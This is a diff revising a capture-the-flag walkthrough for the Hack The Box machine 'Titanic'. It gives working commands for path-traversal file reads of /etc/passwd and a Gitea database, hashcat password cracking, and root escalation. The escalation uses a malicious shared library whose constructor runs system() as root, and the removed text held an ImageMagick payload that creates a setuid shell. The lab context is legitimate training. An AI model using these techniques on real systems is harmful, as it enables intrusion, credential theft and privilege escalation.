@@ -1,190 +1,145 @@
+
 # Titanic – HTB Walkthrough
 
 ## 🧭 Enumeration
-We begin by scanning the open ports on the host:
+We begin by scanning all ports on the host:
 
 ```bash
 nmap -sS -p- 10.10.11.55 -T5
 ```
 
 Output:
+```bash
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+```
 
-PORT     STATE SERVICE  
-22/tcp   open  ssh  
-80/tcp   open  http  
+Port 80 is hosting a web application, and port 22 is running an SSH service.
 
-Port 80 running an HTTP service and port 22 (SSH) are open on the target.
-
-⸻
-
-🔍 Service Detection on Port 80
-
+## 🔍 Port 80 – Web Discovery
 ```bash
 nmap -sV -p 80 10.10.11.55 -T5
 ```
 
 Output:
-
-80/tcp open  http    Apache httpd 2.4.52
-
-Gunicorn is a Python WSGI HTTP server, often used to serve Flask apps.  
-Browsing the website (after adding `titanic.htb` to your `/etc/hosts`) reveals a landing page for booking ship trips.
-
-⸻
-
-🧪 Web Application & LFI
-
-The website features a booking form which, when submitted, generates a JSON file via a redirect to:
-
-```
-/download?ticket=<ticket_id>.json
+```bash
+80/tcp open  http Apache httpd 2.4.52
 ```
 
-Testing for LFI by replacing the `ticket` parameter yields:
+After adding `titanic.htb` to `/etc/hosts`, browsing the site reveals a ship booking platform.  
+Submitting the booking form triggers the download of a JSON file from:
+
+```
+/download?ticket=<uuid>.json
+```
+
+## 🧪 Local File Inclusion (LFI)
+Modifying the `ticket` parameter confirms the presence of LFI:
 
 ```bash
 curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
 ```
 
-Which returns the contents of `/etc/passwd`.
-
-Similarly, accessing:
+We're also able to retrieve:
 
 ```bash
 curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
 ```
 
-Returns:
-
-```
-1675dbe3cc3d3ab35d0e5db3bb8e8679
-```
-
 → ✅ User flag obtained.
 
-Fuzzing the `/download` endpoint (using `ffuf`) confirms directory traversal and file disclosure on various sensitive files (e.g., crontab, passwd, etc.).
-
-⸻
-
-🔍 Gitea Enumeration & Database Extraction
-
-Accessing the subdomain `dev.titanic.htb` reveals a Gitea instance.  
-Two repositories are of interest:
-- `docker-config`
-- `flask-app`
-
-In the `docker-config` repo, a Docker Compose file for MySQL is found:
+## 🔍 dev.titanic.htb – Gitea Discovery
+Exploring the subdomain `dev.titanic.htb` reveals a Gitea instance. Inside the `docker-config` repository:
 
 ```yaml
-version: '3.8'
 services:
   mysql:
-    image: mysql:8.0
-    container_name: mysql
-    ports:
-      - "127.0.0.1:3306:3306"
     environment:
       MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
-      MYSQL_DATABASE: tickets 
       MYSQL_USER: sql_svc
       MYSQL_PASSWORD: sql_password
-    restart: always
 ```
 
-Furthermore, a Docker Compose file for Gitea reveals the path of the database:
-
+We also find the Gitea data volume path:
 ```
 /home/developer/gitea/data/gitea/gitea.db
 ```
 
-Using the LFI vulnerability, the file is downloaded:
-
+Using the LFI vulnerability:
 ```bash
 curl -s "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
 ```
 
-Opening the database with `sqlite3` reveals the user table. Extracting the credentials of the developer user:
+Open the file using `sqlite3` and extract the developer's credentials.
 
-```sql
-SELECT lower_name, salt, passwd FROM user;
-```
-
-Hash and salt values are obtained, converted (e.g., with `gitea2hashcat`) and cracked with hashcat:
+## 🔐 Cracking Developer Credentials
+Convert the hash into hashcat format (mode 10900) and run:
 
 ```bash
 hashcat -m 10900 hash.txt rockyou.txt
 ```
 
-→ developer: `25282528`
+Result:
+```
+developer:25282528
+```
 
-⸻
+→ ✅ SSH access gained.
 
-🔐 SSH Access as Developer
-
-With the cracked credentials:
-
+## 🧑‍💻 SSH Access as developer
 ```bash
 ssh developer@titanic.htb
 ```
 
-Once logged in, enumeration confirms access to `/opt/scripts`, where a script stands out.
-
-⸻
-
-🧪 ImageMagick Exploit & identify_images.sh
-
-In `/opt/scripts`, the script `identify_images.sh` is found:
+Once inside, we find a suspicious script at `/opt/scripts/identify_images.sh`:
 
 ```bash
 cd /opt/app/static/assets/images
 truncate -s 0 metadata.log
-find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+find . -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
 ```
 
-This script uses `magick identify` to process `.jpg` images and extract metadata.
+## 🧨 Privilege Escalation via ImageMagick
 
-To trigger RCE via ImageMagick:
-1. Craft a JPEG file with:
-   - JPEG magic bytes (FF D8 ...)
-   - An MVG payload embedded in a comment
-   - JPEG trailer (FF D9)
+The installed version of ImageMagick (`7.1.1-35`) is vulnerable to RCE.  
+We can exploit this by planting a malicious shared object named `libxcb.so.1`:
 
-Example:
+```c
+gcc -x c -shared -fPIC -o libxcb.so.1 - << EOF
+#include <stdlib.h>
+__attribute__((constructor)) void init() {
+    system("cp /root/root.txt /tmp/root.txt;");
+}
+EOF
+```
+
+Drop it into the script’s working directory:
+
 ```bash
-magick convert -size 640x480 xc:white -set comment "push graphic-context
-viewbox 0 0 640 480
-fill 'url(|cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash|)'
-pop graphic-context" evil.jpg
+mv libxcb.so.1 /opt/scripts/
 ```
 
-Drop `evil.jpg` in the image directory and wait for the script to execute (e.g., via cron).
+When the script is executed, it will load our forged shared object.
 
-Then:
+As a result, we get the root flag in `/tmp`:
+
 ```bash
-/tmp/rootbash -p
+cat /tmp/root.txt
 ```
 
-→ Root shell obtained ✅
+→ ✅ Root flag obtained.
 
-⸻
+## 🏁 Summary
 
-🏁 Summary
-
-| Step          | Description                                              |
-|---------------|----------------------------------------------------------|
-| nmap          | Enumerate ports (SSH on 22, HTTP on 80)                  |
-| Web           | Discover booking form & LFI on `/download?ticket=`      |
-| LFI           | Extract `/etc/passwd`, `/home/developer/user.txt`       |
-| Gitea         | Extract and crack developer credentials from gitea.db   |
-| SSH           | SSH access as `developer`                               |
-| ImageMagick   | Craft malicious JPEG to gain root via identify script   |
+| Step          | Description                                                 |
+|---------------|-------------------------------------------------------------|
+| nmap          | Enumerated open ports (22, 80)                              |
+| LFI           | Exploited `/download?ticket=` to read local files           |
+| Gitea         | Found dev.titanic.htb and retrieved Gitea database          |
+| DB Dump       | Extracted and cracked developer password from `gitea.db`   |
+| SSH           | Gained shell access as developer                            |
+| ImageMagick   | Dropped malicious `libxcb.so.1` to escalate privileges      |
+| Root          | Read root flag via the triggered payload                    |
 
 🎉 Rooted!
-
-⸻
-
-🧠 Lessons Learned
-- LFI vulnerabilities can expose sensitive files and escalate quickly.
-- Misconfigurations (like Docker/Gitea exposure) are critical entry points.
-- ImageMagick has a history of dangerous parsing bugs.
-- File extension ≠ file type — magic bytes matter.
